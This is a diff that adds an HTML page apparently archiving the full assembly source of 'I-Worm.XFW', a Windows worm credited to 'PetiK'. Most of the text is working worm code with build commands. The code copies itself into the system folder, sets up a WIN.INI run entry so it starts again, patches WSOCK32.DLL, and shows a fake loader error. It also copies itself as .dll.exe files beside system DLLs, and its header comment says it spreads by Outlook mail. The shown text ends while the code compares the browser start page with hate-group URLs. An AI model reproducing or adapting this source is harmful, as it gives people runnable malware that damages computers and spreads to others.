@@ -1,0 +1,511 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>20010803 - I-Worm.XFW</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF8000;
+}
+.sc3 {
+	color: #808080;
+}
+.sc4 {
+	color: #000080;
+}
+.sc5 {
+}
+.sc6 {
+	color: #0000FF;
+}
+.sc8 {
+	color: #8080FF;
+	background: #FFFFCC;
+}
+.sc9 {
+	color: #0080FF;
+}
+.sc10 {
+	color: #000080;
+}
+.sc12 {
+	color: #808000;
+}
+.sc13 {
+	color: #808080;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment #</span><span class="sc0">
+</span><span class="sc1">; Name : I-Worm.XFW (Extra French Worm)</span><span class="sc0">
+</span><span class="sc1">; Author : PetiK</span><span class="sc0">
+</span><span class="sc1">; Date : July 10th - August 3th</span><span class="sc0">
+</span><span class="sc1">; Size :  5632 byte (compressed with UPX)</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; Action: It copies itself to \SYSTEM\Services.exe. It adds a value in the run services key :</span><span class="sc0">
+</span><span class="sc1">;   "Run Services"="\SYSTEM\Services.exe". It alters the "run=" lines int he WIN.INI file.</span><span class="sc0">
+</span><span class="sc1">;   It copies the file WSOCK32.DLL by WSOCK32.PTK and alters the original file while add</span><span class="sc0">
+</span><span class="sc1">;   "PetiK" in the file.It displays a message and create a \WINDOWS\Tool_PetiK.txt.</span><span class="sc0">
+</span><span class="sc1">;   This file explains how repair WSOCK32.DLL.</span><span class="sc0">
+</span><span class="sc1">;   If the worm is located in the \SYSTEM folder, it searches all DLL files in the</span><span class="sc0">
+</span><span class="sc1">;   current folder (SYSTEM here) and copies them by the worm while add the ".EXE" extention.</span><span class="sc0">
+</span><span class="sc1">;           FILE.DLL ==&gt;&gt; FILE.DLL.EXE</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">;   It creates at the end if the computer is connected a VBS file to spread with Outlook.</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; To delete :       del \WINDOWS\SYSTEM\Wsock32.dll</span><span class="sc0">
+</span><span class="sc1">;                   ren \WINDOWS\SYSTEM\Wsock32.ptk \WINDOWS\SYSTEM\Wsock32.dll</span><span class="sc0">
+</span><span class="sc1">;                   del \WINDOWS\SYSTEM\Services.exe</span><span class="sc0">
+</span><span class="sc1">;                   del \WINDOWS\SYSTEM\*.dll.exe</span><span class="sc0">
+</span><span class="sc1">;                   del \WINDOWS\Tool_PetiK.txt</span><span class="sc0">
+</span><span class="sc1">;                   del in the WIN.INI file after run=</span><span class="sc0">
+</span><span class="sc1">;                   del C:\.vbs</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; tasm32 /M /ML XFW.asm</span><span class="sc0">
+</span><span class="sc1">; tlink32 -Tpe -aa -x XFW.obj,,,import32</span><span class="sc0">
+</span><span class="sc1">; upx -9 XFW.exe</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; #</span><span class="sc0">
+
+</span><span class="sc2">.586p</span><span class="sc0">
+</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
+</span><span class="sc9">.code</span><span class="sc0">
+
+</span><span class="sc1">;JUMPS</span><span class="sc0">
+
+</span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
+</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
+</span><span class="sc9">endm</span><span class="sc0">
+
+</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">
+
+
+</span><span class="sc5">DEBUT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">INET</span><span class="sc0">
+</span><span class="sc5">VERIF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">50h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szOrig</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">50h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCopie</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"\SERVICES.EXE"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCopie</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szOrig</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCopie</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmp</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">INF_DLL</span><span class="sc0">
+
+</span><span class="sc5">COPIE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCopie</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szOrig</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                     </span><span class="sc1">; copy to \SYSTEM\Services.exe</span><span class="sc0">
+
+</span><span class="sc5">W_INI</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Winini</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"\\WIN.INI"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Winini</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Winini</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCopie</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"run"</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"windows"</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0">
+    
+</span><span class="sc5">WSOCK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">a_wsck</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FIN</span><span class="sc0">
+    </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">"OSW\"
+</span><span class="sc0">    </span><span class="sc6">stosd</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"23KC"</span><span class="sc0">
+    </span><span class="sc6">stosd</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"LLD."</span><span class="sc0">
+    </span><span class="sc6">stosd</span><span class="sc0">
+    </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; serach \SYSTEM\Wsock32.dll</span><span class="sc0">
+
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">a_wsck</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">n_wsck</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">n_wsck</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlen</span><span class="sc0">
+    </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">; to become \SYSTEM\Wsock32</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"KTP."</span><span class="sc0">                  </span><span class="sc1">; and \SYSTEM\Wsock32.ptk</span><span class="sc0">
+    
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">n_wsck</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">a_wsck</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FIN</span><span class="sc0">
+    
+    </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">a_wsck</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+    </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FIN</span><span class="sc0">
+    </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc5">WsckHdl</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    
+    </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">04h</span><span class="sc0">                       </span><span class="sc1">; PAGE_READWRITE</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">WsckHdl</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FIN2</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc5">WsckMap</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+
+    </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">06h</span><span class="sc0">                       </span><span class="sc1">; SECTION_MAP_WRITE or READ</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">WsckMap</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FIN3</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc5">WsckView</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"P"</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">FIN3</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"eP"</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc3">"it"</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc3">"K"</span><span class="sc0">
+
+</span><span class="sc5">FIN4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">WsckView</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">
+</span><span class="sc5">FIN3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">WsckMap</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+</span><span class="sc5">FIN2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">WsckHdl</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+
+</span><span class="sc5">F_MESS</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Loader Error"</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"This program will be terminated"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
+
+</span><span class="sc5">TOOLS</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"\Tool_PetiK.txt"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">40000000h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">TXTSIZE</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">txtd</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+    </span><span class="sc6">popad</span><span class="sc0">
+    </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">FIN</span><span class="sc0">
+
+</span><span class="sc5">INF_DLL</span><span class="sc4">:</span><span class="sc0">
+</span><span class="sc5">D_INF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">50</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCurFolder</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCurFolder</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">
+</span><span class="sc5">FFF</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Search</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"*.dll"</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">                    </span><span class="sc1">; search all DLL files</span><span class="sc0">
+    </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">F_INF</span><span class="sc0">
+    </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">htmlHdl</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+</span><span class="sc5">i_file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Search.cFileName</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlen</span><span class="sc0">
+    </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"EXE."</span><span class="sc0">                    </span><span class="sc1">; and add .EXE =&gt; file.dll.exe</span><span class="sc0">
+    </span><span class="sc6">stosd</span><span class="sc0">
+    </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">stosd</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Search.cFileName</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szOrig</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                     </span><span class="sc1">; and copies with the main worm</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">S_P</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Search</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">htmlHdl</span><span class="sc4">]</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">i_file</span><span class="sc0">
+</span><span class="sc5">FC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">htmlHdl</span><span class="sc4">]</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc0">
+    </span><span class="sc6">popad</span><span class="sc0">
+</span><span class="sc5">F_INF</span><span class="sc4">:</span><span class="sc0">
+
+</span><span class="sc5">S_P</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">   
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Software\Microsoft\Internet Explorer\Main"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">80000001h</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">FIN</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PageSize</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">Page</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ValueType</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">   
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Start Page"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">RegHandle</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc5">callx</span><span class="sc0">  </span><span class="sc5">RegCloseKey</span><span class="sc0">
+
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"http://www.whitesonly.net"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">Page</span><span class="sc0">
+    </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmp</span><span class="sc0">
+    </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">FORMAT</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"http://www.kkk.com"</span><span class="sc0">
